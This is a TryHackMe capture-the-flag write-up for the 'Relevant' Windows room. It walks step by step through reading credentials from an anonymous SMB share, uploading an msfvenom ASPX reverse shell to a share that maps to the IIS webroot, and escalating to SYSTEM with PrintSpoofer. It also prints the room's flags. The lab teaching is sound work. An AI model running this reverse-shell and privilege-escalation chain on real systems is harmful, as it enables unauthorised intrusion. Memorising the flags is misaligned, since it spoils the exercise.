# 🛡️ TryHackMe – Relevant - Writeup

## 📌 Overview
**Room Name:** Relevant  
**Platform:** TryHackMe  
**Difficulty:** Medium  
**Category:** Windows / SMB / IIS / PrivEsc

Windows Server 2016 machine. Anonymous SMB access leaks credentials, a shared folder maps to an IIS webroot enabling ASPX shell upload, and SeImpersonatePrivilege is exploited with PrintSpoofer for SYSTEM.

Attack chain overview:

- Port scanning revealing IIS on ports 80 and 49663, SMB on 445
- Anonymous SMB enumeration → `passwords.txt` with Base64-encoded credentials
- Confirming the SMB share maps to the IIS 49663 webroot
- Uploading an ASPX reverse shell via SMB → triggering via HTTP
- Shell as `iis apppool\defaultapppool` with SeImpersonatePrivilege
- PrintSpoofer64.exe for privilege escalation to SYSTEM

---

## 🔍 1. Enumeration

### 🔎 Port Scan

```bash
rustscan -a <TARGET_IP> -- -sV
```

```text
80/tcp    open  http     Microsoft IIS 10.0
135/tcp   open  msrpc    Microsoft Windows RPC
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016
3389/tcp  open  ms-wbt-server (RDP)
49663/tcp open  http     Microsoft IIS 10.0
49666/tcp open  msrpc
49667/tcp open  msrpc
```

Two IIS instances stood out immediately — port 80 (standard) and 49663 (non-standard). SMB on 445 was the natural first target for anonymous enumeration.

### 🗂️ SMB Enumeration

```bash
smbclient -L //<TARGET_IP> -N
```

```text
Sharename    Type  Comment
---------    ----  -------
ADMIN$       Disk  Remote Admin
C$           Disk  Default share
IPC$         IPC   Remote IPC
nt4wrksv     Disk
```

The `nt4wrksv` share allowed anonymous access:

```bash
smbclient //<TARGET_IP>/nt4wrksv -N
```

Inside the share:

```text
passwords.txt
```

```bash
get passwords.txt
cat passwords.txt
```

```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJFcwckQhMTIz
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY2OSEk
```

Decoded via Base64:

```bash
echo "Qm9iIC0gIVBAJFcwckQhMTIz" | base64 -d
# Bob - !P@$W0rD!123

echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY2OSEk" | base64 -d
# Bill - Juw4nnaM4n420696969!$
```

### 🔑 SMB Auth Verification

```bash
crackmapexec smb <TARGET_IP> -u Bob -p '!P@$W0rD!123'
```

```text
[+] Relevant\Bob:!P@$W0rD!123 (Pwn3d!)
```

Credentials were valid, and the account had **WRITE access** to the `nt4wrksv` share — confirmed with `crackmapexec`.

### 🌐 SMB Share = IIS Webroot Hypothesis

The share name `nt4wrksv` and the non-standard IIS port 49663 felt connected. Tested the hypothesis:

```bash
curl http://<TARGET_IP>:49663/nt4wrksv/passwords.txt
```

The file was served over HTTP. **The SMB share maps directly to the IIS 49663 webroot** — meaning anything uploaded to the share is immediately accessible and executable via the web server.

---

## 🔓 2. Initial Access

### 💀 ASPX Reverse Shell via SMB Upload

Generated an ASPX reverse shell with msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f aspx -o shell.aspx
```

> **Failure — PHP shell:** Initially generated a PHP reverse shell (`-f php`). Uploading and triggering it returned nothing.
> **Root cause:** IIS cannot execute PHP by default. IIS serves `.aspx` (ASP.NET) files natively. Switched to `-f aspx` and the shell worked.

Uploaded the shell to the SMB share:

```bash
smbclient //<TARGET_IP>/nt4wrksv -U 'Bob%!P@$W0rD!123'
put shell.aspx
```

Started a listener and triggered the shell:

```bash
nc -lvnp 4444

curl http://<TARGET_IP>:49663/nt4wrksv/shell.aspx
```

```text
whoami
# iis apppool\defaultapppool
```

**Initial foothold established.** ✅

---

## 👑 3. Privilege Escalation: IIS AppPool → SYSTEM

### 🔍 Checking Privileges

```bash
whoami /priv
```

```text
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

`SeImpersonatePrivilege` is enabled — a classic indicator that a token impersonation attack (e.g., PrintSpoofer, Juicy Potato) will work on this host.

### 🏆 PrintSpoofer Exploitation

Transferred `PrintSpoofer64.exe` to the target via the SMB share:

```bash
# On Kali — copy to share
smbclient //<TARGET_IP>/nt4wrksv -U 'Bob%!P@$W0rD!123' -c "put PrintSpoofer64.exe"

# On target shell — retrieve from webroot path
copy C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe C:\Windows\Temp\
```

> **Failure — running PrintSpoofer from wrong directory:** The first attempt ran `PrintSpoofer64.exe -i -c cmd` directly from the webroot path `C:\inetpub\wwwroot\nt4wrksv\`. It silently failed with no output.
> **Root cause:** The IIS AppPool user likely lacked execution permissions in the webroot. Copying the binary to `C:\Windows\Temp\` and running it from there succeeded.

```bash
cd C:\Windows\Temp
PrintSpoofer64.exe -i -c cmd
```

```text
whoami
# nt authority\system
```

**SYSTEM ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

Path: `C:\Users\Bob\Desktop\user.txt`

### 👑 Root Flag

```
THM{1fk5kf469devly1gl320zafgl345pv}
```

Path: `C:\Windows\System32\config\root.txt`

---

## 📚 Key Takeaways

- 🗂️ **Anonymous SMB access is a critical misconfiguration:** A world-readable share containing encoded credentials handed over a valid login without any brute-forcing. Always enumerate SMB shares unauthenticated first.

- 🔗 **Map SMB shares to web directories:** When a non-standard IIS port exists alongside a named SMB share, test whether the share name appears as a virtual path on the web server. File upload via SMB can become RCE via HTTP.

- 🪟 **IIS executes ASPX, not PHP:** PHP shells silently fail on IIS. Recognize the web server stack before generating a shell — IIS requires `.aspx`, Apache/Nginx needs `.php`.

- 🎭 **SeImpersonatePrivilege means impersonation attacks are viable:** Any service account running IIS or MSSQL typically has this privilege. PrintSpoofer and Juicy Potato reliably escalate to SYSTEM from this position on modern Windows targets.

- 📁 **Binary execution context matters:** Executables in IIS webroot directories may fail silently due to AppPool permission restrictions. Copy tools to `C:\Windows\Temp\` or another writable directory before running them.

---

## 🛠️ Tools Used

- `rustscan`
- `smbclient`
- `crackmapexec`
- `msfvenom`
- `nc` (netcat)
- `curl`
- `PrintSpoofer64.exe`
- `base64`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
